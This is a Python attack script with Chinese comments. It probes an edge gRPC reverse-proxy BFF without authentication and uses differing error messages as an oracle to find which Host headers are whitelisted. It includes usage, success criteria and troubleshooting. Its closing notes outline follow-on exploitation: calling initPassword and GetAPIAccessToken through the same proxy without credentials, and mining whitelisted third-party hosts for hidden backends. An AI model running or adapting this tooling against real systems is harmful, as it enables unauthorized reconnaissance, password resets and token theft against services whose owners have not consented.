# 边缘 gRPC 反代 BFF 的 Host 白名单 oracle（未授权 / 只读）
#
# 结论先讲：POST /api/connect/<svc>/<method> 在 Host 命中边缘白名单时被无鉴权转发给
# 一台按 Host 索引的 gRPC 反代 BFF。BFF 只用 trailers 的 grpc-message 区分两件事：
#   - Host 在白名单里        -> "server grpc is unavailable"（后端 gRPC 挂了，但条目在）
#   - Host 不在白名单里      -> "host '<X>' not found"
# 两种都是 HTTP 200 / grpc-status 14，仅文本不同 => 稳定的 host oracle，无需任何凭据。
#
# 前提
#  - 目标边缘按 Host 头选路（不是只看 SNI）。
#  - 可直连边缘 443；本机必须绕开本地 HTTP 代理（代理会自己按 Host 改连，结论作废）。
#  - 必须用 HTTP/2（ALPN=h2）。用 HTTP/1.1 打会得到 505 "gRPC requires HTTP/2"。
#  - 路径用 pb.PingService/ping 这种"必然存在"的探针即可，服务名写错也仍能拿到
#    host oracle 的两句分叉回显（因为是 Host 查表先于方法解析）。
#
# 依赖：pip install h2
#
# 用法：
#   python hostoracle.py --edge 192.0.2.16 --sni target485.example.com \
#                        --hosts hosts.txt --out hostoracle.out
#   hosts.txt 每行一个候选 Host；建议先放两行对照：真实主域名 + 一个编造名。

import argparse, socket, ssl, sys, time
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, TrailersReceived, StreamEnded

EMPTY_GRPC_FRAME = b"\x00\x00\x00\x00\x00"   # 5 字节：无压缩、长度 0

def probe(edge, sni, host, path="/api/connect/pb.PingService/ping", timeout=15):
    """发一条 gRPC 探针，返回 (status, headers, trailers, body)。"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((edge, 443), timeout=timeout)
    sock = ctx.wrap_socket(raw, server_hostname=sni)   # SNI = 真实域名，与 Host 解耦
    assert sock.selected_alpn_protocol() == "h2", "边缘未协商 h2"

    conn = H2Connection(config=H2Configuration(client_side=True))
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    sid = conn.get_next_available_stream_id()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", host),          # <-- 变化的只有这里
        (":path", path),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
        ("user-agent", "hostoracle/1.0"),
    ]
    conn.send_headers(sid, headers, end_stream=False)
    conn.send_data(sid, EMPTY_GRPC_FRAME, end_stream=True)
    sock.sendall(conn.data_to_send())

    status, rheaders, trailers, body = None, [], [], b""
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            data = sock.recv(65535)
            if not data:
                break
            for ev in conn.receive_data(data):
                if isinstance(ev, ResponseReceived):
                    rheaders = ev.headers
                    status = dict(rheaders).get(b":status")
                elif isinstance(ev, DataReceived):
                    body += ev.data
                    conn.acknowledge_received_data(ev.flow_controlled_length, sid)
                elif isinstance(ev, TrailersReceived):
                    trailers = ev.headers
                elif isinstance(ev, StreamEnded):
                    raise StopIteration
            sock.sendall(conn.data_to_send())
    except StopIteration:
        pass
    finally:
        try: sock.close()
        except Exception: pass
    return status, rheaders, trailers, body


def classify(trailers):
    t = dict(trailers)
    msg = (t.get(b"grpc-message") or b"").decode("utf-8", "replace")
    code = (t.get(b"grpc-status") or b"").decode()
    if "server grpc is unavailable" in msg:
        return "IN_WHITELIST", code, msg
    if "not found" in msg:
        return "NOT_IN_WHITELIST", code, msg
    return "UNKNOWN", code, msg


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--edge", required=True)
    ap.add_argument("--sni", required=True)
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--out", default="hostoracle.out")
    ap.add_argument("--sleep", type=float, default=0.15)
    a = ap.parse_args()

    hosts = [l.strip() for l in open(a.hosts, encoding="utf-8") if l.strip()]
    hits = 0
    with open(a.out, "w", encoding="utf-8") as f:
        for h in hosts:
            try:
                st, hd, tr, body = probe(a.edge, a.sni, h)
                ver, code, msg = classify(tr)
            except Exception as e:
                st, ver, code, msg = "-", "ERROR", "", repr(e)
            if ver == "IN_WHITELIST":
                hits += 1
            line = "%s\tstatus=%s\t%s\tgrpc-status=%s\t%s" % (ver, st, h, code, msg)
            print(line)
            f.write(line + "\n")
            time.sleep(a.sleep)
    print("---- hits=%d/%d -> %s" % (hits, len(hosts), a.out))


if __name__ == "__main__":
    main()

# ---------------------------------------------------------------------------
# 判据（缺一条都不算成立）
#  1) 基线 Host（真实主域名）=> grpc-status 14 + "server grpc is unavailable"
#  2) 编造 Host            => grpc-status 14 + "host '<编造名>' not found"
#  3) 换第二台同段边缘复现同样两句（排除单 IP 特例）
#  4) 同一 Host 下 /api/connect 之外的路由行为不同（例如 /api/console-auth/session
#     在该边缘 404，而在 console 宿主边缘 200 + Set-Cookie）=> 证明这条 BFF 只挂
#     /api/connect，不是前端 SPA 兜底
#
# 常见失败原因
#  - 走了本地 HTTP 代理：代理按 Host 改连，回显与边缘无关 -> --noproxy '*'。
#  - 用 HTTP/1.1：505 "gRPC requires HTTP/2"。
#  - SNI 与 Host 不同步：SNI 决定选中哪张证书/哪个边缘站点，Host 决定切哪台 BFF。
#  - 打到 console 前端边缘而非 BFF 边缘：全部 not-found（甚至 404/HTML）。
#  - 写错路径前缀：/api/connect 是必需的；换成 /api/v1 等会落到别的 handler。
#
# 边界
#  - 只证明 Host 条目存在，不代表后端 gRPC 活着（unavailable 期间拿不到业务数据）。
#  - BFF 同时是现成 gRPC 转发通道：后端恢复后，用同一入口 + 已还原的 proto
#    (pb.* 方法表) 可直接打 getSystemStatus / initPassword / GetAPIAccessToken，
#    同样不需要凭据。
#  - 命中白名单的第三方 Host 继续用 GET / 比对 body hash 做 vhost 确认，再扒前端
#    配置找真后端（见 kb: edge-host-whitelist-third-party-vhost-isolation-*）。
